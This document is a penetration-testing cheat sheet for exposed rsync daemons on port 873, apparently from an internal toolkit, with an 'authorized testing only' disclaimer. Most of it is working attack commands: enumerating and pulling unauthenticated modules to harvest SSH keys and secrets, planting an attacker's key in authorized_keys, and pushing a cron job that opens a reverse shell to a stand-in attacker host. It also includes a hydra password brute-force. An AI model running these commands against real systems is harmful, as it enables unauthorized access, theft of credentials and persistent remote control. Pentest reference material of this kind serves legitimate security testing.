---
service: rsync
title: Rsync
ports: 873
aliases: rsyncd
---

# Rsync — quick wins

**When you see it:** 873/tcp open and `rsync rsync://H/` returns a module list with no
password prompt — unauthenticated modules give you read and potentially write access to
whatever path each module maps to on disk.

> Authorized testing only. Triage is read-only; steps marked ✏️ write to the target — clean
> up any pushed files after the engagement.

## Triage (read-only)
```sh
nmap -sV --script rsync-list-modules -p 873 H   # version + module names via NSE
rsync rsync://H/                                  # list modules (short form)
rsync rsync://H/MODULE                            # list contents of MODULE
nc -nv H 873                                      # banner grab; send "@RSYNCD: 31.0" then "#list"
```

## Quick wins

### Enumerate and pull an unauthenticated module
```sh
rsync -av rsync://H/MODULE ./loot/
```
*Why:* if the module has no `auth users` or `secrets file` set in `rsyncd.conf`, rsync
transfers all files without prompting — harvest configs, SSH keys, and application secrets
directly.

### Config-file leak — find rsyncd.conf via a readable module
```sh
rsync -av rsync://H/MODULE/ . --include="*.conf" --include="*.secret*" --exclude="*"
# look for: path =, secrets file =, auth users =
```
*Why:* pulling `rsyncd.conf` (often at `/etc/rsyncd.conf`) reveals `secrets file` paths
and the disk path each module maps to — use those to pivot to targeted reads.

### Push files to a writable module ✏️
```sh
# plant an authorized_keys (if module maps to a home dir)
rsync -av ~/.ssh/id_rsa.pub rsync://H/MODULE/.ssh/authorized_keys

# or push a cron job (if module maps to /var/spool/cron)
echo "* * * * * bash -i >& /dev/tcp/ATT/4444 0>&1" > /tmp/rcron
rsync -av /tmp/rcron rsync://H/MODULE/root
```
*Why:* writable unauthenticated modules allow arbitrary file placement; the write path
depends on what filesystem path the module exposes (`path =` in rsyncd.conf).

### Brute-force a password-protected module
```sh
hydra -l admin -P /usr/share/wordlists/rockyou.txt rsync://H/MODULE
```
*Why:* some modules set `auth users` with weak credentials; hydra speaks the rsync protocol
natively.

## aranum helpers
- `aranumtoolkit/network/enum-rsync.sh` — dispatcher that produced this finding (module
  list, per-module content probe, auth check).

## Gotchas
- `@ERROR: access denied to MODULE from ...` — your source IP is blocked by `hosts allow`
  in `rsyncd.conf`, not necessarily an auth failure; try from a different host.
- Module list may be empty even on a live service if `list = false` is set for all modules;
  try guessing common names (`backup`, `data`, `home`, `www`).
- `--checksum` mode: rsync by default skips files with matching size+mtime; use `-c` if
  you suspect truncated transfers.
- Pushing files requires the daemon to run as a user with write permission on the path; many
  read-only module configs omit `read only = false` explicitly, which means read-only is the
  default.

## Sources
- HackTricks `873-pentesting-rsync`; Hackviser Rsync pentesting;
  ivanversluis/pentest-hacktricks `873-pentesting-rsync.md`; VeryLazyTech Rsync port 873.
